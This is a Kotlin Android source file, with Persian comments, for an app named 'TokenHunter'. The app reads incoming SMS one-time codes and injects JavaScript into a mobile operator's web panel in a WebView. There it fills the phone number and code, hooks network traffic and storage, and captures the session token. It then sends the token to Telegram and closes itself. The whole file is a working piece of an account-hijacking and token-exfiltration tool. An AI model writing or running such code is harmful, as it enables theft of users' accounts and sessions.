package ir.venice.tokenhunter

import android.Manifest
import android.annotation.SuppressLint
import android.content.pm.PackageManager
import android.os.Bundle
import android.util.Log
import android.view.View
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.ArrayAdapter
import android.widget.Button
import android.widget.EditText
import android.widget.Spinner
import android.widget.TextView
import androidx.activity.ComponentActivity
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.content.ContextCompat
import androidx.lifecycle.Lifecycle
import androidx.lifecycle.lifecycleScope
import androidx.lifecycle.repeatOnLifecycle
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

class MainActivity : ComponentActivity() {

    companion object {
        private const val TAG = "MainActivity"
        private const val FLOW_TIMEOUT_MS = 120_000L
        private const val MAX_OTP_ATTEMPTS = 3
    }

    private lateinit var spOperator: Spinner
    private lateinit var etPhone: EditText
    private lateinit var etUrl: EditText
    private lateinit var btnStart: Button
    private lateinit var tvStatus: TextView
    private lateinit var webView: WebView

    private lateinit var bridge: TokenBridge

    private var activeOperator: OperatorConfig? = null
    private var phone: String = ""
    private var otpAttempts = 0
    private var tokenSent = false
    private var timeoutJob: Job? = null

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { grants ->
        val granted = grants[Manifest.permission.RECEIVE_SMS] == true &&
                grants[Manifest.permission.READ_SMS] == true
        if (granted) beginFlow() else status("اجازه‌ی دسترسی به پیامک داده نشد.")
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        spOperator = findViewById(R.id.spOperator)
        etPhone = findViewById(R.id.etPhone)
        etUrl = findViewById(R.id.etUrl)
        btnStart = findViewById(R.id.btnStart)
        tvStatus = findViewById(R.id.tvStatus)
        webView = findViewById(R.id.webView)

        spOperator.adapter = ArrayAdapter(
            this,
            android.R.layout.simple_spinner_dropdown_item,
            Operators.all
        )

        setupWebView()

        btnStart.setOnClickListener {
            val normalized = normalizePhone(etPhone.text.toString())
            if (normalized == null) {
                status("شماره معتبر نیست. نمونه: 09123456789")
                return@setOnClickListener
            }
            phone = normalized
            etPhone.setText(normalized)
            if (hasSmsPermissions()) beginFlow() else requestSmsPermissions()
        }

        lifecycleScope.launch {
            repeatOnLifecycle(Lifecycle.State.STARTED) {
                OtpBus.events.collect(::onOtpEvent)
            }
        }
    }

    // ---------- WebView ----------

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupWebView() {
        bridge = TokenBridge { hit -> runOnUiThread { onTokenFound(hit) } }

        with(webView.settings) {
            javaScriptEnabled = true
            domStorageEnabled = true
            databaseEnabled = true
            loadsImagesAutomatically = true
            mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
            userAgentString = "$userAgentString TokenHunter/1.0"
        }

        WebView.setWebContentsDebuggingEnabled(true)
        webView.addJavascriptInterface(bridge, "TH")

        webView.webViewClient = object : WebViewClient() {
            override fun onPageFinished(view: WebView, url: String) {
                if (tokenSent) return
                view.evaluateJavascript(InjectedJs.interceptors(), null)
                view.evaluateJavascript(InjectedJs.pollStorage(), null)

                val op = activeOperator ?: return
                // چند تلاش برای پر کردن شماره؛ خود JS در صورت وجود فیلد OTP رد می‌کند.
                listOf(1_500L, 5_000L).forEach { d ->
                    view.postDelayed({
                        if (!tokenSent) {
                            view.evaluateJavascript(InjectedJs.fillPhone(op, phone), null)
                        }
                    }, d)
                }
            }
        }
    }

    private fun onTokenFound(hit: TokenHit) {
        if (tokenSent) return
        tokenSent = true
        timeoutJob?.cancel()

        val op = activeOperator ?: return
        status("توکن شکار شد (${hit.value.length} کاراکتر) — ارسال به تلگرام…")

        lifecycleScope.launch {
            val ok = ApiHelper.sendToken(hit, phone, op.title)
            status(if (ok) "ارسال شد. خروج." else "ارسال به تلگرام ناموفق بود.")
            if (ok) {
                webView.stopLoading()
                delay(1_200)
                finishAndRemoveTask()
            } else {
                tokenSent = false
                btnStart.isEnabled = true
            }
        }
    }

    // ---------- جریان اصلی ----------

    private fun beginFlow() {
        val op = spOperator.selectedItem as? OperatorConfig ?: return
        activeOperator = op

        otpAttempts = 0
        tokenSent = false

        OtpBus.acceptSince = System.currentTimeMillis()
        OtpBus.senderFilter = op.senderHints

        btnStart.isEnabled = false
        webView.visibility = View.VISIBLE
        etPhone.isEnabled = false
        spOperator.isEnabled = false

        val url = etUrl.text.toString().trim().ifBlank { op.startUrl }
        status("در حال باز کردن پنل ${op.title} …")
        webView.loadUrl(url)

        timeoutJob?.cancel()
        timeoutJob = lifecycleScope.launch {
            delay(FLOW_TIMEOUT_MS)
            if (!tokenSent) {
                status("زمان تمام شد؛ توکنی دریافت نشد.")
                btnStart.isEnabled = true
            }
        }
    }

    private fun onOtpEvent(event: OtpEvent) {
        when (event) {
            is OtpEvent.Code -> {
                if (tokenSent || otpAttempts >= MAX_OTP_ATTEMPTS) return
                otpAttempts++
                val op = activeOperator ?: return
                Log.d(TAG, "کد از ${event.sender}")
                status("کد ${event.code} از ${event.sender} — تزریق…")
                webView.evaluateJavascript(InjectedJs.fillOtp(op, event.code), null)
                webView.evaluateJavascript(InjectedJs.pollStorage(), null)
            }
            is OtpEvent.Ignored -> Log.d(TAG, "رد شد: ${event.reason}")
        }
    }

    // ---------- کمکی ----------

    private fun hasSmsPermissions() =
        ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) ==
                PackageManager.PERMISSION_GRANTED &&
                ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) ==
                PackageManager.PERMISSION_GRANTED

    private fun requestSmsPermissions() {
        status("درخواست دسترسی پیامک…")
        permissionLauncher.launch(
            arrayOf(Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS)
        )
    }

    /** ارقام فارسی/عربی به لاتین، سپس نرمال‌سازی به 09xxxxxxxxx */
    private fun normalizePhone(raw: String): String? {
        val map = "۰۱۲۳۴۵۶۷۸۹".zip('0'..'9').toMap() +
                "٠١٢٣٤٥٦٧٨٩".zip('0'..'9').toMap()
        val digits = buildString {
            raw.forEach { c ->
                val d = map[c] ?: c
                if (d.isDigit()) append(d)
            }
        }
        return when {
            digits.length == 10 && digits.startsWith("9") -> "0$digits"
            digits.length == 11 && digits.startsWith("09") -> digits
            digits.length == 12 && digits.startsWith("989") -> "0" + digits.substring(2)
            else -> null
        }
    }

    private fun status(text: String) {
        tvStatus.text = text
        Log.d(TAG, text)
    }

    @Deprecated("Deprecated in Java")
    override fun onBackPressed() {
        if (webView.visibility == View.VISIBLE && webView.canGoBack()) webView.goBack()
        else super.onBackPressed()
    }
}